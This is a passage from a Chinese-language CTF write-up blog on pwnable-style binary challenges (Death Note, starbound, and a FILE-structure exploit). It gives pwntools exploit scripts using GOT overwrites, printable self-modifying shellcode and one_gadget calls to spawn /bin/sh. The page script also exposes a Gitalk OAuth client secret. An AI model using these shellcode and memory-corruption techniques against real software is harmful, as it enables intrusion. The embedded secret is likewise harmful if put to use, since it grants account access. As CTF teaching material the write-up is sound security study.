class="title">readf</span>():</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writef</span>():</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closef</span>():</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"5"</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,name)</span><br><span class="line"></span><br><span class="line">openf(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line">readf()</span><br><span class="line">writef()</span><br><span class="line">readf()</span><br><span class="line">writef()</span><br><span class="line">ru(<span class="string">b"[heap]\n"</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(re(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">fakefile_addr = <span class="number">0x0804B284</span></span><br><span class="line">payload = <span class="string">b"a"</span>*<span class="number">0x20</span> + p32(fakefile_addr)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>) + <span class="string">b";/bin/sh"</span> <span class="comment">#;$0</span></span><br><span class="line"><span class="comment"># payload += b"\x00"*0x88</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>+<span class="number">0x24</span>,<span class="string">b"\x00"</span>)</span><br><span class="line">payload += p32(fakefile_addr + <span class="number">0x98</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system)</span><br><span class="line"></span><br><span class="line">quit(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x0C-Death-Note"><a href="#0x0C-Death-Note" class="headerlink" title="0x0C Death Note"></a>0x0C Death Note</h2><p>漏洞点在add时，利用了int类型的idx，所以可以修改到got表，利用add修改到puts的got，写入shellcode即可</p>
<p><img src="https://files.catbox.moe/omdov6.png" alt="image-20221126215338101"></p>
<p>难点在于printable函数，限制了shellcode只能为可打印字符，所以int 0x80以及非可打印字符均不可使用。</p>
<p>用到的方法是在shellcode的最后写入<code>'\x6b\x40'</code>，然后在shellcode中使用<code>sub byte ptr[eax + 43], dl</code>等，将<code>'\x6b\x40'</code>，修改为<code>\xcd\x80</code>，即int 0x80，eax = 0x0b则使用xor来实现</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"Index :"</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">"Name :"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">"Index :"</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sla(<span class="string">"Index :"</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment"># eax = 0xb ebx = /bin/sh ecx = 0 edx = 0 int 0x80 = /xcd/x80</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">push 0x732f2f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">push 0x60</span></span><br><span class="line"><span class="string">pop edx</span></span><br><span class="line"><span class="string">sub byte ptr[eax + 43], dl</span></span><br><span class="line"><span class="string">sub byte ptr[eax + 43], dl</span></span><br><span class="line"><span class="string">sub byte ptr[eax + 42], dl</span></span><br><span class="line"><span class="string">push 0x3e</span></span><br><span class="line"><span class="string">pop edx</span></span><br><span class="line"><span class="string">sub byte ptr[eax + 42], dl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">pop edx </span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">xor al, 0x60</span></span><br><span class="line"><span class="string">xor al, 0x6b</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcode))</span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b'\x6b\x40'</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">add(-<span class="number">16</span>,shellcode)</span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://files.catbox.moe/gqpdze.png" alt="image-20221126220246095"></p>
<p>不太理解栈上<code>/bin/sh</code>字符串的截断问题，这里用的shellcraft.sh()中的/bin///sh</p>
<h2 id="0x0D-starbound"><a href="#0x0D-starbound" class="headerlink" title="0x0D starbound"></a>0x0D starbound</h2><p><img src="https://files.catbox.moe/u4xv4y.png" alt="image-20230301140357375"></p>
<p>一个可以玩的游戏，代码量很大，漏洞在主函数输出选项时，调用函数指针，而索引v3是int型，造成越界访问。</p>
<p>在设置中username可以自己设置，即可以修改bss段地址，计算偏移，可以得到位于-33的位置上。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    main_menu();</span><br><span class="line">    <span class="keyword">if</span> ( !readn(nptr, <span class="number">0x100</span>u) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = strtol(nptr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))nop[v3])();<span class="comment">// vlun</span></span><br><span class="line">  }</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>修改name为函数指针即可。</p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><p><code>0x0008048e48：add esp 0x1c </code>，要先调整栈帧，以能够执行到puts_plt，最后执行system(‘ -33;/bin/sh’)，但是不理解为什么要在前面加个空格才能成功。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x0804A605</span></span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">'6'</span>)</span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">sla(<span class="string">' name:'</span>,p32(<span class="number">0x0008048e48</span>))</span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">b'-33\x00'</span>+<span class="string">b'aaaa'</span>+p32(puts_plt)+p32(main_addr)+p32(puts_got))</span><br><span class="line">libc_base = l32() - <span class="number">0x67d90</span></span><br><span class="line">inf(libc_base)</span><br><span class="line">ogg = one_gadget(libc_base)</span><br><span class="line"><span class="comment"># inf(ogg[0])</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b'/bin/sh\x00'</span>)) + libc_base</span><br><span class="line">inf(system)</span><br><span class="line">inf(binsh)</span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">'6'</span>)</span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="comment"># sla(' name:',p32(system))</span></span><br><span class="line"><span class="comment"># sa('&gt;',' -33;/bin/sh\x00')</span></span><br><span class="line">sla(<span class="string">' name:'</span>,p32(ogg[<span class="number">1</span>]))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">sla(<span class="string">'&gt;'</span>,<span class="string">'-33'</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>


        </div>


            <section class="post-copyright">
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://ld1ng.top/2020/10/25/Pwnable/">http://ld1ng.top/2020/10/25/Pwnable/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
		
		<section class="post-tags">
		<div>
		<span>Tags: </span>
		<span class="tag">
		
		
		<!-- <a href="/tags/CTF/"># CTF</a> -->
		<a href="/tags/CTF/">🏷️CTF</a>
		
		<!-- <a href="/tags/wp/"># wp</a> -->
		<a href="/tags/wp/">🏷️wp</a>
		
		
		</span>
		</div>
		<!-- 支持一下的按钮与图片 -->
		<div class="reward" id="reward">
		<div class="sponser">
		<div class="sponser_btn">☕Buy Me a Coffee</div>
		<div class="sponser_img">
		<div class="sponser_container">
	
		<div class="alipay">
		<span class="sponser_alipay_title"></span>
		<div>
		<img class="sponser_alipay" src="/image/Wechat.jpg">
		</div>
		</div>
	
		</div>
		</div>
		</div>
		</div>
		<div>
		<a href="javascript:window.history.back();">Back</a>
		<span>· </span>
		<a href="/">Home</a>
		</div>
		</section>
		
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/10/25/Oct_Match/">Oct_Match 2020</a>
            
            
            <a class="next" rel="next" href="/2020/09/28/Sep_Match/">Sep_Match 2020</a>
            
        </section>
		

    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
<div id="gitalk-container"></div>
<script type="text/javascript">
      var gitalk = new Gitalk({
        clientID: '458a98372426d92cae5a',
        clientSecret: '91e874ad339e3ffbd20d52f4d247739c8e722a72',
        repo: 'ld1ng.github.io',
        owner: 'Ld1ng',
        admin: 'Ld1ng',
        id: md5(location.pathname),
        labels: 'Gitalk'.split(',').filter(l => l),
        perPage: 10,
        pagerDirection: 'last',
        createIssueManually: true,
        distractionFreeMode: false
      })
      gitalk.render('gitalk-container')
</script>


    </article>
</div>
            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Ld1ng🍕 © 2020 - 2024 │ Powered by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a><a></a>
		
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<span class="site-pv">
    | Visitors: 
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


</span>
    </div>
</footer>

    </div>
</body>

<!-- 搜索功能 -->
<!-- Chic/layout.ejs -->
<div id="u-search">
    <div class="modal">
        <div class="modal-header">
            <div class="container">
                <form id="u-search-modal-form" class="u-search-modal-form">
                    <button type="submit" class="form-submit-btn">
                        <img src="/image/search.png" class="search-btn-img" />
                    </button>
                    <input placeholder="搜索内容..." class="form-input" id="modal-form-input">
                </form>
                <a class="modal-close">x</a>
            </div>
            <div class="search-loading">
                <div class="search-loading-bar"></div>
            </div>
        </div>
        <div class="modal-body">
        </div>
    </div>
    <div class="modal-overlay"></div>
</div>

</html>